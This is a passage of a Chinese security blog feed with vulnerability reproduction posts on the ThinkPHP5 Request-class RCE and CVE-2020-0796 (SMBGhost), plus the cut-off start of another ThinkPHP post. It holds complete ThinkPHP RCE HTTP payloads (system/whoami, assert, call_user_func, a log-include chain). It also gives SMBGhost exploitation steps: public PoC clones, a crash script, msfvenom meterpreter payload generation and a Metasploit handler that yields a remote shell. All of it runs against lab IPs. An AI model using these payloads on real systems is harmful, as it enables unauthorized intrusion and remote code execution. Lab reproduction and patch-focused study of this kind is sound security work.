class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：   </p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png" alt><br>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png" alt></p><blockquote><p>Payload 2</p></blockquote>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../runtime/log/202007/08.log&amp;x=phpinfo();</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：   </p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png" alt><br>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png" alt></p><blockquote><p>Payload 3</p></blockquote>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=assert&amp;server[]=phpinfo&amp;get[]=phpinfo()</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：   </p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" alt></p><blockquote><p>Payload 4</p></blockquote>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：   </p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" alt></p><h2 id="版本-5-1-10（PHP7-3-4-Apache2-4-39）"><a href="#版本-5-1-10（PHP7-3-4-Apache2-4-39）" class="headerlink" title="版本 5.1.10（PHP7.3.4+Apache2.4.39）"></a>版本 5.1.10（PHP7.3.4+Apache2.4.39）</h2><p>5.1和5.2两个版本现在用的很少，并且针对于这两个版本有点鸡肋，需要index.php文件中跳过报错提示。 语句：error_reporting(0);</p><p>需设置 <code>error_reporting(0);</code></p><blockquote><p> Payload：</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">c=system&amp;f=whoami&amp;_method=filter</span><br></pre></td></tr></table></figure><p>一开始执行结果如下图：</p><p><img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" alt></p><p>找到RuleGroup.php 新增一行代码error_reporting(0);跳过报错</p><p><img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png" alt></p><p>然后查看结果</p><p><img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png" alt></p><h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ol><li><p>线上环境建议关闭debug模式</p></li><li><p>升级到ThinkPHP 5.0.24</p></li><li><p>手动增加过滤，在<code>thinkphp/library/think/Request.php</code>添加如下代码：</p><p><img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png" alt></p></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://seaii-blog.com/index.php/2019/01/14/88.html" target="_blank" rel="noopener">ThinkPHP5 远程代码执行漏洞分析</a></p><p><a href="https://xz.aliyun.com/t/3845#toc-0" target="_blank" rel="noopener">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p><p><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">ThinkPHP5 核心类 Request 远程代码漏洞分析</a></p><p><a href="https://blog.csdn.net/csacs/article/details/86668057" target="_blank" rel="noopener">ThinkPHP 5.0.x、5.1.x、5.2.x 全版本远程命令执行漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ThinkPHP5-核心类-Request-远程代码漏洞复现-Poc&quot;&gt;&lt;a href=&quot;#ThinkPHP5-核心类-Request-远程代码漏洞复现-Poc&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5 核心类 Request 远程代码漏洞复现+Poc&quot;&gt;&lt;/a&gt;ThinkPHP5 核心类 Request 远程代码漏洞复现+Poc&lt;/h1&gt;&lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;2019年1月11日，ThinkPHP团队发布了一个&lt;a href=&quot;https://blog.thinkphp.cn/910675&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;补丁更新&lt;/a&gt;，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。&lt;/p&gt;
&lt;p&gt;ThinkPHP官方发布新版本5.0.24，在1月14日和15日又接连发布两个更新，这三次更新都修复了一个安全问题，该问题可能导致远程代码执行 ，这是ThinkPHP近期的第二个高危漏洞，两个漏洞均是无需登录即可远程触发，危害极大。&lt;/p&gt;
&lt;p&gt;之前写过一篇文章《&lt;a href=&quot;https://chaceshadow.github.io/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/#method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ThinkPHP-5-代码执行漏洞复现-POC&lt;/a&gt;》里面有提过一次，这篇文章主要对其不同版本下进行详细的复现。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="ThinkPHP 5" scheme="http://yoursite.com/tags/ThinkPHP-5/"/>
    
      <category term="ThinkPHP" scheme="http://yoursite.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796 SMBv3 RCE漏洞检测+复现</title>
    <link href="http://yoursite.com/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-06-09T12:11:00.000Z</published>
    <updated>2020-06-09T13:45:56.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，恶意伪造的压缩数据包 时出现的错误引发的，从而造成SMB服务器的缓冲区溢出,攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。</p></blockquote><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p></blockquote><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p>漏洞存在于在srv2.sys驱动中，由于SMB没有正确处理压缩的数据包，在解压数据包的时候调用函数Srv2DecompressData处理压缩数据时候，对压缩数据头部压缩数据大小OriginalCompressedSegmentSize和其偏移Offset的没有检查其是否合法，导致其相加可分配较小的内存，后面调用SmbCompressionDecompress进行数据处理时候使用这片较小的内存可导致拷贝溢出或越界访问，而在执行本地程序的时候，可通过获取当前本地程序的token+0x40的偏移地址，通过发送压缩数据给SMB服务器，之后此偏移地址在解压缩数据时候拷贝的内核内存中，通过精心构造的内存布局在内核中修改token将权限提升。</p></blockquote><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>漏洞不影响 win7，漏洞影响 Windows 10 1903 之后的各个 32 位、64 位版 Windows，包括家用版、专业版、企业版、教育版。</p><blockquote><p>Windows 10 Version 1903 for 32-bit<br>Windows 10 Version 1903 for x64<br>Windows 10 Version 1903 for arm64<br>Windows 10 Version 1909 for 32-bit<br>Windows 10 Version 1909 for x64<br>Windows 10 Version 1909 for arm64<br>Windows Server 10 Version 1903 for server core installation<br>Windows Server 10 Version 1909 for server core installation</p></blockquote><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><dl><dt>攻击机：Kali Linux</dt><dd>IP：192.168.219.135<br>可以 ping 通 win10 虚拟机</dd></dl><dl><dt>靶 机：Windows 10 虚拟机 1909 x64 (专业版）</dt><dd>IP：192.168.219.142<br>关闭防火墙和 defender<br>1903 或者 1909 版本均可，我这里用的是1909版本</dd></dl><p>宿主机：Windows 7</p><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><p>首先确认系统版本符合要求<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/1.png" alt><br>使用systeminfo确定下主机有没有打过这个补丁KB4551762<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/2.png" alt><br>关闭防火墙和 defender<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/3.png" alt></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="git脚本检测"><a href="#git脚本检测" class="headerlink" title="git脚本检测"></a>git脚本检测</h3><blockquote><p><a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">https://github.com/ollypwn/SMBGhost</a></p></blockquote><p>检测返回的数据包中SMB压缩版本，这种检测方式打过补丁依然会误报。<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/4.png" alt><br><em>PS:脚本适用python3，宿主机电脑中只有python2，稍微修改一下print即可</em></p><h3 id="奇信安检测工具"><a href="#奇信安检测工具" class="headerlink" title="奇信安检测工具"></a>奇信安检测工具</h3><blockquote><p><a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip" target="_blank" rel="noopener">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p></blockquote><p>适用于局域网批量检测，快速查找未打补丁的机器。<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/5.png" alt></p><h3 id="腾讯电脑管家SMB漏洞修复工具"><a href="#腾讯电脑管家SMB漏洞修复工具" class="headerlink" title="腾讯电脑管家SMB漏洞修复工具"></a>腾讯电脑管家SMB漏洞修复工具</h3><blockquote><p><a href="http://dlied6.qq.com/invc/QQPatch/QuickFix_SMB0796.exe" target="_blank" rel="noopener">http://dlied6.qq.com/invc/QQPatch/QuickFix_SMB0796.exe</a></p></blockquote><p>适用于个人用户检测，一键快速检测和修复。<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/6.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="蓝屏演示"><a href="#蓝屏演示" class="headerlink" title="蓝屏演示"></a>蓝屏演示</h3><p>蓝屏攻击POC:</p><blockquote><p><a href="https://github.com/eerykitty/CVE-2020-0796-PoC" target="_blank" rel="noopener">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;eerykitty&#x2F;CVE-2020-0796-PoC.git</span><br><span class="line">python3 setup.py install</span><br><span class="line">python3 CVE-2020-0796.py 192.168.219.142</span><br></pre></td></tr></table></figure><p>安装脚本和依赖库<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/7.png" alt><br>依赖库安装成功后执行蓝屏攻击脚本<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/8.png" alt><br>攻击成功结果如下<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/9.png" alt></p><h3 id="提权演示"><a href="#提权演示" class="headerlink" title="提权演示"></a>提权演示</h3><p>本地提权POC:</p><blockquote><p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a></p></blockquote><p>文件编译结果执行文件有两个，一个动态的，一个静态的，动态的需要另外安装相关dll文件，我们直接执行静态提权程序，成功弹出更高的system权限命令执行窗口</p><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/10.png" alt></p><h3 id="RCE演示"><a href="#RCE演示" class="headerlink" title="RCE演示"></a>RCE演示</h3><p>远程利用POC:</p><blockquote><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p></blockquote><ul><li>Kali下载POC</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;cve# git clone https:&#x2F;&#x2F;github.com&#x2F;chompie1337&#x2F;SMBGhost_RCE_PoC</span><br><span class="line">root@kali:~&#x2F;cve# cd SMBGhost_RCE_PoC</span><br><span class="line">root@kali:~&#x2F;cve&#x2F;SMBGhost_RCE_PoC# ls</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/11.png" alt><br><em>PS：该POC需要用python3环境执行</em></p><ul><li>使用msfvenom生成payload，生成TXT文件便于后面修改</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;cve&#x2F;SMBGhost_RCE_PoC# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;1234 -f py -o 1.txt</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/12.png" alt></p><ul><li>将1.txt 生成的code中参数buf改为USER_PAYLOAD，然后替换到exploit.py中的USER_PAYLOAD参数。（顺序不要颠倒，否则执行会失败的，因为你在py全文替换buf的话，不小心会把代码中的全部的buf替换的）</li></ul><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/13.png" alt><br>这里不要忘记字符串前面的二进制格式换<code>b&quot;&quot;</code>不然脚本执行错误<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/14.png" alt></p><ul><li>新建一个终端，启动msf监听本地端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 1234</span><br><span class="line">lport &#x3D;&gt; 1234</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set rhost 192.168.219.142</span><br><span class="line">rhost &#x3D;&gt; 192.168.219.142</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/15.png" alt></p><ul><li>运行exploit.py</li></ul><p><code>python3 exploit.py -ip 192.168.219.142</code><br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/16.png" alt></p><p>一开始没反应，试了好几次，最后成功反弹shell（大家尝试的时候多试几次，看网上其他大佬说很容易蓝屏，蓝屏没有遇到，只是前几次每次执行后没反应，然后发现win10卡死了，ping不通，重启靶机即可）<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/17.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/xiaozi/p/13062533.html" target="_blank" rel="noopener">CVE-2020-0796 检测及利用工具</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，恶意伪造的压缩数据包 时出现的错误引发的，从而造成SMB服务器的缓冲区溢出,攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="CVE-2020-0796" scheme="http://yoursite.com/tags/CVE-2020-0796/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="SMB" scheme="http://yoursite.com/tags/SMB/"/>
    
      <category term="POC" scheme="http://yoursite.com/tags/POC/"/>
    
      <category term="漏洞检测" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5 代码执行漏洞复现+POC</title>
    <link href="http://yoursite.com/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/"/>
    <id>http://yoursite.com/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/</id>
    <published>2020-06-09T12:07:00.000Z</published>
    <updated>2020-06-09T13:38:47.899Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ThinkPHP-5-0-10-环境框架搭建"><a href="#ThinkPHP-5-0-10-环境框架搭建" class="headerlink" title="ThinkPHP 5.0.10 环境框架搭建"></a>ThinkPHP 5.0.10 环境框架搭建</h2><p>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。</p><a id="more"></a><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/1.png" alt><br>查看当前版本<br><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/2.png" alt><br>环境搭建成功</p><h2 id="缓存类导致RCE"><a href="#缓存类导致RCE" class="headerlink" title="缓存类导致RCE"></a>缓存类导致RCE</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</p></blockquote><h3 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h3><p><strong>漏洞利用条件</strong></p><ol><li>基于tp5开发的代码中使用了Cache::set 进行缓存</li><li>在利用版本范围内</li><li>runtime目录可以访问</li></ol><p>创建一个生成缓存的页面<br><img 